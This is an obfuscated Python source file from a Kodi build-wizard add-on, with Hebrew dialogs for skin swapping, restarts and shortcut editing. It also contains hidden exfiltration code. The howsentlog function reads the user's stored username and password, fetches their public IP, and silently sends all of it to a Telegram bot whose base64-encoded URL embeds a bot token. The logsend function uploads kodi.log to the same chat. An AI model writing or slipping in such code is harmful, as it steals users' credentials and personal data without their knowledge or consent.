# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	OO0OO00000O0O00OO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	OO00OO0O00OOOO00O =[];OOO00OO0O0OOO0O0O =[]#line:261
	for O0OOO0OOO0O00OOO0 in sorted (OO0OO00000O0O00OO ,key =lambda OO00OO00OOOOOO000 :OO00OO00OOOOOO000 ):#line:262
		O0O000OOOOO00OOOO =os .path .split (O0OOO0OOO0O00OOO0 [:-1 ])[1 ]#line:263
		OO00O00OOO000OO0O =os .path .join (O0OOO0OOO0O00OOO0 ,'addon.xml')#line:264
		if os .path .exists (OO00O00OOO000OO0O ):#line:265
			O00O00OOO00000OOO =open (OO00O00OOO000OO0O )#line:266
			O00O0000OOO00000O =O00O00OOO00000OOO .read ()#line:267
			OOOO00O00OOO0OO0O =parseDOM2 (O00O0000OOO00000O ,'addon',ret ='id')#line:268
			OO000OO0OOO0O0O0O =O0O000OOOOO00OOOO if len (OOOO00O00OOO0OO0O )==0 else OOOO00O00OOO0OO0O [0 ]#line:269
			try :#line:270
				OO0O000OO0000O000 =xbmcaddon .Addon (id =OO000OO0OOO0O0O0O )#line:271
				OO00OO0O00OOOO00O .append (OO0O000OO0000O000 .getAddonInfo ('name'))#line:272
				OOO00OO0O0OOO0O0O .append (OO000OO0OOO0O0O0O )#line:273
			except :#line:274
				pass #line:275
	OOO0OO00OOO000000 =[];OO0OO00OO00OOO0OO =0 #line:276
	OO00OOOOO0OO0O000 =["Current Skin -- %s"%currSkin ()]+OO00OO0O00OOOO00O #line:277
	OO0OO00OO00OOO0OO =DIALOG .select ("Select the Skin you want to swap with.",OO00OOOOO0OO0O000 )#line:278
	if OO0OO00OO00OOO0OO ==-1 :return #line:279
	else :#line:280
		O00OOOO0OOOOO00OO =(OO0OO00OO00OOO0OO -1 )#line:281
		OOO0OO00OOO000000 .append (O00OOOO0OOOOO00OO )#line:282
		OO00OOOOO0OO0O000 [OO0OO00OO00OOO0OO ]="%s"%(OO00OO0O00OOOO00O [O00OOOO0OOOOO00OO ])#line:283
	if OOO0OO00OOO000000 ==None :return #line:284
	for O0O00OOOOOO000000 in OOO0OO00OOO000000 :#line:285
		swapSkins (OOO00OO0O0OOO0O0O [O0O00OOOOOO000000 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (O00O0O0000O00O00O ,title ="Error"):#line:290
	OO00O000O0OOO000O ='lookandfeel.skin'#line:291
	OO00O0OOOOO00OOO0 =O00O0O0000O00O00O #line:292
	O0O000O00OOOOOOO0 =getOld (OO00O000O0OOO000O )#line:293
	O0OOOOO000O0OO0O0 =OO00O000O0OOO000O #line:294
	setNew (O0OOOOO000O0OO0O0 ,OO00O0OOOOO00OOO0 )#line:295
	OO00OOO00OOO0OOO0 =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO00OOO00OOO0OOO0 <100 :#line:297
		OO00OOO00OOO0OOO0 +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (O0OOOOO00O000OO00 ):#line:304
	try :#line:305
		O0OOOOO00O000OO00 ='"%s"'%O0OOOOO00O000OO00 #line:306
		O00OOO00O000OOOO0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OOOOO00O000OO00 )#line:307
		O00O0000OOO00O0O0 =xbmc .executeJSONRPC (O00OOO00O000OOOO0 )#line:309
		O00O0000OOO00O0O0 =simplejson .loads (O00O0000OOO00O0O0 )#line:310
		if O00O0000OOO00O0O0 .has_key ('result'):#line:311
			if O00O0000OOO00O0O0 ['result'].has_key ('value'):#line:312
				return O00O0000OOO00O0O0 ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (OOOO0OOO000OO00OO ,O0O0O0OOOOO000O0O ):#line:319
	try :#line:320
		OOOO0OOO000OO00OO ='"%s"'%OOOO0OOO000OO00OO #line:321
		O0O0O0OOOOO000O0O ='"%s"'%O0O0O0OOOOO000O0O #line:322
		O0OOO00O00OOO00O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOOO0OOO000OO00OO ,O0O0O0OOOOO000O0O )#line:323
		OOO0O00000000O000 =xbmc .executeJSONRPC (O0OOO00O00OOO00O0 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			O00000O000OOOO000 =xbmcgui .DialogProgress ()#line:334
			O00000O000OOOO000 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			O00000O000OOOO000 .update (0 )#line:338
			for OO0O0O0000O0OOOO0 in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				O00000O000OOOO000 .update (int ((5 -OO0O0O0000O0OOOO0 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0O0O0000O0OOOO0 ),'')#line:341
				if O00000O000OOOO000 .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			O00000O000OOOO000 =xbmcgui .DialogProgress ()#line:347
			O00000O000OOOO000 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			O00000O000OOOO000 .update (0 )#line:351
			for OO0O0O0000O0OOOO0 in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				O00000O000OOOO000 .update (int ((5 -OO0O0O0000O0OOOO0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0O0O0000O0OOOO0 ),'')#line:354
				if O00000O000OOOO000 .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:365
  wiz .kodi17Fix ()#line:366
def howsentlog ():#line:368
       try :#line:369
          import json #line:370
          O00O00OO0OOO00O00 =(ADDON .getSetting ("user"))#line:371
          OOO0OOO0O000O00O0 =(ADDON .getSetting ("pass"))#line:372
          OOOO0OOO0O0OO0000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:373
          OOO0OOO00O000000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:375
          OO0OO0000000000O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:376
          OO0OO00OO00OOOO00 =str (json .loads (OO0OO0000000000O0 )['ip'])#line:377
          OO0OOO00O00OOO00O =O00O00OO0OOO00O00 #line:378
          O00O0OO0000O00O00 =OOO0OOO0O000O00O0 #line:379
          import socket #line:381
          OO0OO0000000000O0 =urllib2 .urlopen (OOO0OOO00O000000O .decode ('base64')+' - '+OO0OOO00O00OOO00O +' - '+O00O0OO0000O00O00 +' - '+OOOO0OOO0O0OO0000 ).readlines ()#line:382
       except :pass #line:383
def googleindicat ():#line:386
			import logg #line:387
			OOOO0OO000OO0OOO0 =(ADDON .getSetting ("pass"))#line:388
			OOO000O000OOOOOOO =(ADDON .getSetting ("user"))#line:389
			logg .logGA (OOOO0OO000OO0OOO0 ,OOO000O000OOOOOOO )#line:390
def logsend ():#line:391
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:392
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:393
      howsentlog ()#line:395
      import requests #line:396
      if xbmc .getCondVisibility ('system.platform.windows'):#line:397
         O0O00O00O0O000O0O =xbmc .translatePath ('special://home/kodi.log')#line:398
         OOO000O0O0OOO0OOO ={'chat_id':(None ,'-274262389'),'document':(O0O00O00O0O000O0O ,open (O0O00O00O0O000O0O ,'rb')),}#line:402
         OOOOO0OOO0OO00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:403
         O00OOO0O0OO00O000 =requests .post (OOOOO0OOO0OO00OO0 .decode ('base64'),files =OOO000O0O0OOO0OOO )#line:405
      elif xbmc .getCondVisibility ('system.platform.android'):#line:406
           O0O00O00O0O000O0O =xbmc .translatePath ('special://temp/kodi.log')#line:407
           OOO000O0O0OOO0OOO ={'chat_id':(None ,'-274262389'),'document':(O0O00O00O0O000O0O ,open (O0O00O00O0O000O0O ,'rb')),}#line:411
           OOOOO0OOO0OO00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:412
           O00OOO0O0OO00O000 =requests .post (OOOOO0OOO0OO00OO0 .decode ('base64'),files =OOO000O0O0OOO0OOO )#line:414
      else :#line:415
           O0O00O00O0O000O0O =xbmc .translatePath ('special://kodi.log')#line:416
           OOO000O0O0OOO0OOO ={'chat_id':(None ,'-274262389'),'document':(O0O00O00O0O000O0O ,open (O0O00O00O0O000O0O ,'rb')),}#line:420
           OOOOO0OOO0OO00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:421
           O00OOO0O0OO00O000 =requests .post (OOOOO0OOO0OO00OO0 .decode ('base64'),files =OOO000O0O0OOO0OOO )#line:423
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:424
def rdoff ():#line:426
	resloginit .resloginit ('restore','all')#line:428
	OOOOOO0O0OO00O000 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:429
	OO0O0OO0OO00O00O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:430
	copyfile (OOOOOO0O0OO00O000 ,OO0O0OO0OO00O00O0 )#line:431
def skindialogsettind18 ():#line:432
	try :#line:433
		O0OO0000O0OOO00O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:434
		O0OO0OO000O0O00OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:435
		copyfile (O0OO0000O0OOO00O0 ,O0OO0OO000O0O00OO )#line:436
	except :pass #line:437
def rdon ():#line:438
	loginit .loginIt ('restore','all')#line:439
	O0OOO0000OO0OO00O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:441
	OO0OO0OO0000OOOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:442
	copyfile (O0OOO0000OO0OO00O ,OO0OO0OO0000OOOO0 )#line:443
def adults18 ():#line:445
  OO0OOO0OOOOOO0O00 =(ADDON .getSetting ("adults"))#line:446
  if OO0OOO0OOOOOO0O00 =='true':#line:447
    OO000OOO00OOOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:448
    with open (OO000OOO00OOOO000 ,'r')as OOO0O0OO0O00O00O0 :#line:449
      OOO00OO00OO0OO000 =OOO0O0OO0O00O00O0 .read ()#line:450
    OOO00OO00OO0OO000 =OOO00OO00OO0OO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:468
    with open (OO000OOO00OOOO000 ,'w')as OOO0O0OO0O00O00O0 :#line:471
      OOO0O0OO0O00O00O0 .write (OOO00OO00OO0OO000 )#line:472
def rdbuildaddon ():#line:473
  O00000000000OO0O0 =(ADDON .getSetting ("rdbuild"))#line:474
  if O00000000000OO0O0 =='true':#line:475
    OOOOOO00OO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:476
    with open (OOOOOO00OO00O00O0 ,'r')as O00OO0O0OO0OOOOO0 :#line:477
      OO0O0O0000OOO0000 =O00OO0O0OO0OOOOO0 .read ()#line:478
    OO0O0O0000OOO0000 =OO0O0O0000OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:496
    with open (OOOOOO00OO00O00O0 ,'w')as O00OO0O0OO0OOOOO0 :#line:499
      O00OO0O0OO0OOOOO0 .write (OO0O0O0000OOO0000 )#line:500
    OOOOOO00OO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:504
    with open (OOOOOO00OO00O00O0 ,'r')as O00OO0O0OO0OOOOO0 :#line:505
      OO0O0O0000OOO0000 =O00OO0O0OO0OOOOO0 .read ()#line:506
    OO0O0O0000OOO0000 =OO0O0O0000OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:524
    with open (OOOOOO00OO00O00O0 ,'w')as O00OO0O0OO0OOOOO0 :#line:527
      O00OO0O0OO0OOOOO0 .write (OO0O0O0000OOO0000 )#line:528
    OOOOOO00OO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:532
    with open (OOOOOO00OO00O00O0 ,'r')as O00OO0O0OO0OOOOO0 :#line:533
      OO0O0O0000OOO0000 =O00OO0O0OO0OOOOO0 .read ()#line:534
    OO0O0O0000OOO0000 =OO0O0O0000OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:552
